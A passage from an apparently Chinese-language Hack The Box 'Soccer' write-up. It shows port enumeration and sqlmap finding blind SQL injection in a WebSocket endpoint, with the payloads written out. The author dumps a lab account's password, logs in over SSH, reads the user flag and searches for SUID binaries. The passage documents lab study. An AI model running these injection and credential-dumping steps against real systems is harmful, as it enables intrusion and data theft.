+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">www-data@soccer:/home/player$ ss -ltn<br>ss -ltn<br>State   Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process  <br>LISTEN  <span class="hljs-number">0</span>        <span class="hljs-number">151</span>            <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">3306</span>           <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:*              <br>LISTEN  <span class="hljs-number">0</span>        <span class="hljs-number">511</span>              <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">80</span>             <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:*              <br>LISTEN  <span class="hljs-number">0</span>        <span class="hljs-number">4096</span>       <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.53</span>%lo:<span class="hljs-number">53</span>             <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:*              <br>LISTEN  <span class="hljs-number">0</span>        <span class="hljs-number">128</span>              <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">22</span>             <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:*              <br>LISTEN  <span class="hljs-number">0</span>        <span class="hljs-number">511</span>            <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">3000</span>           <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:*              <br>LISTEN  <span class="hljs-number">0</span>        <span class="hljs-number">511</span>              <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">9091</span>           <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:*              <br>LISTEN  <span class="hljs-number">0</span>        <span class="hljs-number">70</span>             <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">33060</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:*              <br>LISTEN  <span class="hljs-number">0</span>        <span class="hljs-number">511</span>                 [::]:<span class="hljs-number">80</span>                [::]:*              <br>LISTEN  <span class="hljs-number">0</span>        <span class="hljs-number">128</span>                 [::]:<span class="hljs-number">22</span>                [::]:* <br><br><br><br>Hostname, hosts and DNS<br><br><br><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>       localhost       soccer  soccer.htb      soc-player.soccer.htb<br><br><span class="hljs-number">127.0</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span>       ubuntu-focal    ubuntu-focal<br><br><br>╔══════════╣ Active Ports<br>╚ https:<span class="hljs-comment">//book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                              </span><br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">3306</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:*               LISTEN      -                                                                          <br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">80</span>              <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:*               LISTEN      <span class="hljs-number">1111</span>/nginx: worker  <br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.53</span>:<span class="hljs-number">53</span>           <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:*               LISTEN      -                   <br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">22</span>              <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:*               LISTEN      -                   <br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">3000</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:*               LISTEN      -                   <br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">9091</span>            <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:*               LISTEN      -                   <br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">33060</span>         <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:*               LISTEN      -                   <br>tcp6       <span class="hljs-number">0</span>      <span class="hljs-number">0</span> :::<span class="hljs-number">80</span>                   :::*                    LISTEN      <span class="hljs-number">1111</span>/nginx: worker  <br>tcp6       <span class="hljs-number">0</span>      <span class="hljs-number">0</span> :::<span class="hljs-number">22</span>                   :::*                    LISTEN      -    <br></code></pre></td></tr></table></figure>
+
+<p>11、在枚举中，发现系统还有一个子域名的系统，我们绑定下并访问这个地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ echo <span class="hljs-string">&quot;10.10.11.194 soc-player.soccer.htb&quot;</span> | sudo tee -a /etc/hosts<br>[sudo] kali 的密码：<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.194</span> soc-player.soccer.htb<br></code></pre></td></tr></table></figure>
+
+<p><code>http://soc-player.soccer.htb/</code></p>
+<p><img src="http://sh1yan.top/photo/Soccer-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">drwxr-xr-x <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Dec  <span class="hljs-number">1</span>  <span class="hljs-number">2022</span> /etc/nginx/sites-enabled                                                                                          <br>drwxr-xr-x <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Dec  <span class="hljs-number">1</span>  <span class="hljs-number">2022</span> /etc/nginx/sites-enabled<br>lrwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">41</span> Nov <span class="hljs-number">17</span>  <span class="hljs-number">2022</span> /etc/nginx/sites-enabled/soc-player.htb -&gt; /etc/nginx/sites-available/soc-player.htb<br>server &#123;<br>        listen <span class="hljs-number">80</span>;<br>        listen [::]:<span class="hljs-number">80</span>;<br>        server_name soc-player.soccer.htb;<br>        root /root/app/views;<br>        location / &#123;<br>                proxy_pass http:<span class="hljs-comment">//localhost:3000;</span><br>                proxy_http_version <span class="hljs-number">1.1</span>;<br>                proxy_set_header Upgrade $http_upgrade;<br>                proxy_set_header Connection <span class="hljs-string">&#x27;upgrade&#x27;</span>;<br>                proxy_set_header Host $host;<br>                proxy_cache_bypass $http_upgrade;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>12、免费门票当你注册&#x2F;登录 </p>
+<p><code>http://soc-player.soccer.htb/signup</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">shiyan@qq.com<br>shiyan<br>shiyan<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Soccer-htb-writeup/8.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://soc-player.soccer.htb/check</code></p>
+<p><img src="http://sh1yan.top/photo/Soccer-htb-writeup/9.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://soc-player.soccer.htb/match</code></p>
+<p><img src="http://sh1yan.top/photo/Soccer-htb-writeup/10.png" srcset="/img/loading.gif" lazyload></p>
+<p>13、我们在登录进去的页面上的源码里发现了一些信息</p>
+<p><code>view-source:http://soc-player.soccer.htb/check</code></p>
+<p><code>ws://soc-player.soccer.htb:9091</code></p>
+<p><img src="http://sh1yan.top/photo/Soccer-htb-writeup/11.png" srcset="/img/loading.gif" lazyload></p>
+<p>14、到这里多条件分析，发现这里应该就是Websocket的应用接口，下面使用python的三方库验证下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ python3 -m websockets ws:<span class="hljs-comment">//soc-player.soccer.htb:9091/</span><br>Connected to ws:<span class="hljs-comment">//soc-player.soccer.htb:9091/.</span><br>&gt; help<br>&lt; Ticket Doesn<span class="hljs-number">&#x27;</span>t Exist<br>&gt; &#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;<br>&lt; Ticket Doesn<span class="hljs-number">&#x27;</span>t Exist<br>&gt; &#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;58040&quot;</span>&#125;<br>&lt; Ticket Doesn<span class="hljs-number">&#x27;</span>t Exist<br>&gt; eit<br>&lt; Ticket Doesn<span class="hljs-number">&#x27;</span>t Exist<br>&gt; <span class="hljs-built_in">exit</span><br>&lt; Ticket Doesn<span class="hljs-number">&#x27;</span>t Exist<br>&gt; <span class="hljs-built_in">exit</span>()<br>&lt; Ticket Doesn<span class="hljs-number">&#x27;</span>t Exist<br>Connection closed: <span class="hljs-number">1000</span> (OK).<br></code></pre></td></tr></table></figure>
+
+<p>15、sqlmap 可以直接针对 Websocket，因此可以成为从易受攻击的端点转储信息的简单方法。尝试尝试不同的–level和–risk标志。</p>
+<p><code>https://cloud.tencent.com/developer/article/1867137</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sqlmap --url <span class="hljs-string">&quot;ws://soc-player.soccer.htb:9091/&quot;</span> --data=<span class="hljs-string">&#x27;&#123;&quot;id&quot;:&quot;1&quot;&#125;&#x27;</span> --level <span class="hljs-number">5</span> --risk <span class="hljs-number">3</span><br><br><br>sqlmap identified the following injection point(s) with a total of <span class="hljs-number">394</span> HTTP(s) requests:<br>---<br>Parameter: JSON id ((custom) POST)<br>    Type: boolean-based blind<br>    Title: OR boolean-based blind - WHERE or HAVING clause<br>    Payload: &#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;-4486 OR 5386=5386&quot;</span>&#125;<br><br>    Type: time-based blind<br>    Title: MySQL &gt;= <span class="hljs-number">5.0</span><span class="hljs-number">.12</span> AND time-based blind (query SLEEP)<br>    Payload: &#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;1 AND (SELECT 3020 FROM (SELECT(SLEEP(5)))XyhF)&quot;</span>&#125;<br>---<br>[<span class="hljs-number">07</span>:<span class="hljs-number">25</span>:<span class="hljs-number">35</span>] [INFO] the back-end DBMS is MySQL<br>back-end DBMS: MySQL &gt;= <span class="hljs-number">5.0</span><span class="hljs-number">.12</span><br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sqlmap --url <span class="hljs-string">&quot;ws://soc-player.soccer.htb:9091/&quot;</span> --data=<span class="hljs-string">&#x27;&#123;&quot;id&quot;:&quot;1&quot;&#125;&#x27;</span> --level <span class="hljs-number">5</span> --risk <span class="hljs-number">3</span> --dbs<br><br>available databases [<span class="hljs-number">5</span>]:<br>[*] information_schema<br>[*] mysql<br>[*] performance_schema<br>[*] soccer_db<br>[*] sys<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sqlmap --url <span class="hljs-string">&quot;ws://soc-player.soccer.htb:9091/&quot;</span> --data=<span class="hljs-string">&#x27;&#123;&quot;id&quot;:&quot;1&quot;&#125;&#x27;</span> --level <span class="hljs-number">5</span> --risk <span class="hljs-number">3</span> -D <span class="hljs-string">&quot;soccer_db&quot;</span> --tables<br><br>Database: soccer_db<br>[<span class="hljs-number">1</span> table]<br>+----------+<br>| accounts |<br>+----------+<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sqlmap --url <span class="hljs-string">&quot;ws://soc-player.soccer.htb:9091/&quot;</span> --data=<span class="hljs-string">&#x27;&#123;&quot;id&quot;:&quot;1&quot;&#125;&#x27;</span> --level <span class="hljs-number">5</span> --risk <span class="hljs-number">3</span> -D <span class="hljs-string">&quot;soccer_db&quot;</span> -T <span class="hljs-string">&quot;accounts&quot;</span> --columns<br><br>Database: soccer_db<br>Table: accounts<br>[<span class="hljs-number">4</span> columns]<br>+----------+-------------+<br>| Column   | Type        |<br>+----------+-------------+<br>| email    | varchar(<span class="hljs-number">40</span>) |<br>| id       | <span class="hljs-type">int</span>         |<br>| password | varchar(<span class="hljs-number">40</span>) |<br>| username | varchar(<span class="hljs-number">40</span>) |<br>+----------+-------------+<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sqlmap --url <span class="hljs-string">&quot;ws://soc-player.soccer.htb:9091/&quot;</span> --data=<span class="hljs-string">&#x27;&#123;&quot;id&quot;:&quot;1&quot;&#125;&#x27;</span> --level <span class="hljs-number">5</span> --risk <span class="hljs-number">3</span> -D <span class="hljs-string">&quot;soccer_db&quot;</span> -T <span class="hljs-string">&quot;accounts&quot;</span> -C email,username,password --dump<br><br>Database: soccer_db<br>Table: accounts<br>[<span class="hljs-number">1</span> entry]<br>+-------------------+----------+----------------------+<br>| email             | username | password             |<br>+-------------------+----------+----------------------+<br>| player@player.htb | player   | PlayerOftheMatch2022 |<br>+-------------------+----------+----------------------+<br></code></pre></td></tr></table></figure>
+
+<p>16、到这里就获取到了一个用户的账号密码了，开始尝试登录</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ssh player@<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.194</span><br>The authenticity of host <span class="hljs-string">&#x27;10.10.11.194 (10.10.11.194)&#x27;</span> can<span class="hljs-number">&#x27;</span>t be established.<br>ED25519 key fingerprint is SHA256:PxRZkGxbqpmtATcgie2b7E8Sj3pw1L5jMEqe77Ob3FE.<br>This key is not known by any other names.<br>Are you sure you want to <span class="hljs-keyword">continue</span> <span class="hljs-title function_">connecting</span> <span class="hljs-params">(yes/no/[fingerprint])</span>? yes<br>Warning: Permanently added &#x27;10.10.11.194&#x27; <span class="hljs-params">(ED25519)</span> to the <span class="hljs-built_in">list</span> of known hosts.<br>player@10.10.11.194&#x27;s password: <br>Welcome to Ubuntu 20.04.5 <span class="hljs-title function_">LTS</span> <span class="hljs-params">(GNU/Linux <span class="hljs-number">5.4</span><span class="hljs-number">.0</span><span class="hljs-number">-135</span>-generic x86_64)</span><br><br> * Documentation:  https:<span class="hljs-comment">//help.ubuntu.com</span><br> * Management:     https:<span class="hljs-comment">//landscape.canonical.com</span><br> * Support:        https:<span class="hljs-comment">//ubuntu.com/advantage</span><br><br>  System information as of Sat Apr 20 16:04:43 UTC 2024<br><br>  System load:  0.0               Processes:             230<br>  Usage of /:   70.2% of 3.84GB   Users logged in:       0<br>  Memory usage: 25%               IPv4 address <span class="hljs-keyword">for</span> eth0: 10.10.11.194<br>  Swap usage:   0%<br><br> * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s<br>   just raised the bar <span class="hljs-keyword">for</span> easy, resilient and secure K8s cluster deployment.<br><br>   https:<span class="hljs-comment">//ubuntu.com/engage/secure-kubernetes-at-the-edge</span><br><br>0 updates can be applied immediately.<br><br><br>The <span class="hljs-built_in">list</span> of available updates is more than a week old.<br>To check <span class="hljs-keyword">for</span> new updates run: sudo apt update<br><br>Last login: Tue Dec 13 07:29:10 2022 from 10.10.14.19<br>player@soccer:~$ is<br>is: command not found<br>player@soccer:~$ id&amp;hostname&amp;ifconfig<br>[1] 22638<br>[2] 22639<br>soccer<br>uid=<span class="hljs-number">1001</span>(player) gid=<span class="hljs-number">1001</span>(player) groups=<span class="hljs-number">1001</span>(player)<br>eth0: flags=<span class="hljs-number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="hljs-number">1500</span><br>        inet <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.194</span>  netmask <span class="hljs-number">255.255</span><span class="hljs-number">.254</span><span class="hljs-number">.0</span>  broadcast <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.255</span><br>        inet6 fe80::<span class="hljs-number">250</span>:<span class="hljs-number">56f</span>f:feb9:e2cc  prefixlen <span class="hljs-number">64</span>  scopeid <span class="hljs-number">0x20</span>&lt;link&gt;<br>        ether <span class="hljs-number">00</span>:<span class="hljs-number">50</span>:<span class="hljs-number">56</span>:b9:e2:cc  txqueuelen <span class="hljs-number">1000</span>  (Ethernet)                                                                                                                             <br>        RX packets <span class="hljs-number">81324</span>  bytes <span class="hljs-number">13228566</span> (<span class="hljs-number">13.2</span> MB)                                                                                                                                       <br>        RX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span>  overruns <span class="hljs-number">0</span>  frame <span class="hljs-number">0</span>                                                                                                                                      <br>        TX packets <span class="hljs-number">82457</span>  bytes <span class="hljs-number">31239694</span> (<span class="hljs-number">31.2</span> MB)                                                                                                                                       <br>        TX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span> overruns <span class="hljs-number">0</span>  carrier <span class="hljs-number">0</span>  collisions <span class="hljs-number">0</span>                                                                                                                       <br>                                                                                                                                                                                         <br>lo: flags=<span class="hljs-number">73</span>&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="hljs-number">65536</span>                                                                                                                                             <br>        inet <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>  netmask <span class="hljs-number">255.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>                                                                                                                                                <br>        inet6 ::<span class="hljs-number">1</span>  prefixlen <span class="hljs-number">128</span>  scopeid <span class="hljs-number">0x10</span>&lt;host&gt;                                                                                                                                     <br>        loop  txqueuelen <span class="hljs-number">1000</span>  (Local Loopback)<br>        RX packets <span class="hljs-number">476010</span>  bytes <span class="hljs-number">55321617</span> (<span class="hljs-number">55.3</span> MB)<br>        RX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span>  overruns <span class="hljs-number">0</span>  frame <span class="hljs-number">0</span><br>        TX packets <span class="hljs-number">476010</span>  bytes <span class="hljs-number">55321617</span> (<span class="hljs-number">55.3</span> MB)<br>        TX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span> overruns <span class="hljs-number">0</span>  carrier <span class="hljs-number">0</span>  collisions <span class="hljs-number">0</span><br><br>[<span class="hljs-number">1</span>]-  Done                    id<br>[<span class="hljs-number">2</span>]+  Done                    hostname<br>player@soccer:~$ <br></code></pre></td></tr></table></figure>
+
+<p>17、那就获取下第一个flag信息吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">player@soccer:~$ ls -la<br>total <span class="hljs-number">28</span><br>drwxr-xr-x <span class="hljs-number">3</span> player player <span class="hljs-number">4096</span> Nov <span class="hljs-number">28</span>  <span class="hljs-number">2022</span> .<br>drwxr-xr-x <span class="hljs-number">3</span> root   root   <span class="hljs-number">4096</span> Nov <span class="hljs-number">17</span>  <span class="hljs-number">2022</span> ..<br>lrwxrwxrwx <span class="hljs-number">1</span> root   root      <span class="hljs-number">9</span> Nov <span class="hljs-number">17</span>  <span class="hljs-number">2022</span> .bash_history -&gt; /dev/null<br>-rw-r--r-- <span class="hljs-number">1</span> player player  <span class="hljs-number">220</span> Feb <span class="hljs-number">25</span>  <span class="hljs-number">2020</span> .bash_logout<br>-rw-r--r-- <span class="hljs-number">1</span> player player <span class="hljs-number">3771</span> Feb <span class="hljs-number">25</span>  <span class="hljs-number">2020</span> .bashrc<br>drwx------ <span class="hljs-number">2</span> player player <span class="hljs-number">4096</span> Nov <span class="hljs-number">17</span>  <span class="hljs-number">2022</span> .cache<br>-rw-r--r-- <span class="hljs-number">1</span> player player  <span class="hljs-number">807</span> Feb <span class="hljs-number">25</span>  <span class="hljs-number">2020</span> .profile<br>lrwxrwxrwx <span class="hljs-number">1</span> root   root      <span class="hljs-number">9</span> Nov <span class="hljs-number">17</span>  <span class="hljs-number">2022</span> .viminfo -&gt; /dev/null<br>-rw-r----- <span class="hljs-number">1</span> root   player   <span class="hljs-number">33</span> Apr <span class="hljs-number">20</span> <span class="hljs-number">13</span>:<span class="hljs-number">46</span> user.txt<br>player@soccer:~$ cat user.txt<br>e5f77482f14275f0275ba9294d82bfe4<br>player@soccer:~$ <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>18、开始枚举可以提权的内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">player@soccer:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> player: <br>Sorry, user player may not run sudo on localhost.<br>player@soccer:~$ find / -perm -u=s -type f <span class="hljs-number">2</span>&gt;/dev/null<br>/usr/local/bin/doas<br>/usr/lib/snapd/snap-confine<br>/usr/lib/dbus<span class="hljs-number">-1.0</span>/dbus-daemon-launch-helper<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/policykit<span class="hljs-number">-1</span>/polkit-agent-helper<span class="hljs-number">-1</span><br>/usr/lib/eject/dmcrypt-get-device<br>/usr/bin/umount<br>/usr/bin/fusermount<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/newgrp<br>/usr/bin/chfn<br>/usr/bin/sudo<br>/usr/bin/passwd<br>/usr/bin/gpasswd<br>/usr/bin/chsh<br>/usr/bin/at<br>/snap/snapd/<span class="hljs-number">17883</span>/usr/lib/snapd/snap-confine<br>/snap/core20/<span class="hljs-number">1695</span>/usr/bin/chfn<br>/snap/core20/<span class="hljs-number">1695</span>/usr/bin/chsh<br>/snap/core20/<span class="hljs-number">1695</span>/usr/bin/gpasswd<br>/snap/core20/<span class="hljs-number">1695</span>/usr/bin/mount<br>/snap/core20/<span class="hljs-number">1695</span>/usr/bin/newgrp<br>/snap/core20/<span class="hljs-number">1695</span>/usr/bin/passwd<br>/snap/core20/<span class="hljs-number">1695</span>/usr/bin/su<br>/snap/core20/<span class="hljs-number">1695</span>/usr/bin/sudo<br>/snap/core20/<span class="hljs-number">1695</span>/usr/bin/umount<br>/snap/core20/<span class="hljs-number">1695</span>/usr/lib/dbus<span class="hljs-number">-1.0</span>/dbus-daemon-launch-helper<br>/snap/core20/<span class="hljs-number">1695</span>/usr/lib/openssh/ssh-keysign<br>player@soccer:~$ <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">player@soccer:~$ ls -la /usr/local/bin/doas<br>-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">42224</span> Nov <span class="hljs-number">17</span>  <span class="hljs-number">2022</span> /usr/local/bin/doas<br>player@soccer:~$ <br></code></pre></td></tr></table></figure>
+
+<p>19、doas是 OpenBSD 操作系统上常见的替代方案sudo，但可以安装在基于 Debian 的 Linux 操作系统（如 Ubuntu）上。doas.conf我在 中没有看到文件&#x2F;etc，因此我将使用以下命令在文件系统中搜索它find：</p>
